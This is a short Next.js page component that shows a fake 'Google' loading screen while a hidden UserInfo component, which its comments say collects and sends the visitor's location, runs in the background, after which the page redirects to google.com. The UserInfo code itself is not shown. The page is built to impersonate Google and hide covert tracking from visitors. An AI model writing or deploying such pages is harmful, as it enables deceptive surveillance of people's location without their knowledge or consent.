'use client'

import { useEffect } from "react"
import UserInfo from '@/components/UserInfo'

export default function Home() {
  useEffect(() => {
    // Small delay to ensure location info is collected and sent
    const redirectTimer = setTimeout(() => {
      window.location.href = 'https://www.google.com'
    }, 1500) // 1.5 seconds delay

    return () => clearTimeout(redirectTimer)
  }, [])

  return (
    <div className="min-h-screen bg-[#121212] flex items-center justify-center">
      {/* Hidden UserInfo component that runs in the background */}
      <div className="hidden">
        <UserInfo />
      </div>
      
      {/* Simple loading state */}
      <div className="text-white text-center">
        <div className="mb-4 text-6xl font-normal tracking-tighter">Google</div>
        <div className="animate-pulse text-gray-400 text-sm">Loading...</div>
      </div>
    </div>
  )
}
